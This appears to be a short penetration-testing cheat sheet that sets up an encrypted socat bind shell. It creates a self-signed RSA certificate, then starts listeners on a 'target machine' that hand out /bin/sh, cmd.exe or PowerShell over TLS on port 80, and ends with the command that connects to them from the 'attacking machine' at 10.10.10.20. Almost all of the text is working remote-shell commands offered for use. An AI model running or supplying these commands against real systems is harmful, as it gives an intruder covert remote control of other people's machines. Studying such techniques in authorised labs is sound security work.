# create a 2048 bit RSA key with matching cert file
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# setup a listener on the target machine
socat openssl-listen:80,cert=shell.pem,verify=0 exec:/bin/sh
# use the pipes argument to interface between the unix and windows ways of handling input and output
socat openssl-listen:80,cert=shell.pem,verify=0 exec:cmd.exe,pipes
socat openssl-listen:80,cert=shell.pem,verify=0 exec:powershell.exe,pipes

# connect to the listener from the attacking machine
socat openssl:10.10.10.20:80,verify=0 -